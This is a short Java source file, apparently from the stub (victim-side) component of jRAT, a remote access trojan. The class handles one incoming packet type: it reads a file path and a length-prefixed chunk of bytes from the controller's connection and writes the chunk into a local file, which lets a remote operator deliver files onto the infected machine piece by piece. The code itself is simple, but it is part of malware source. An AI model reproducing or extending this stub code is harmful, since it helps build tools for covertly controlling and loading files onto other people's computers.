package se.jrat.stub.packets.incoming;

import java.io.File;

import se.jrat.common.io.FileCache;
import se.jrat.common.io.TransferData;
import se.jrat.stub.Connection;

public class Packet104ClientDownloadPart extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		final String remotePath = Connection.readLine();

		TransferData localData = FileCache.get(remotePath);
		
		byte[] buffer = new byte[Connection.readInt()];
		Connection.dis.readFully(buffer);

		localData.getOutputStream().write(buffer);
		localData.increaseRead(buffer.length);
	}

}
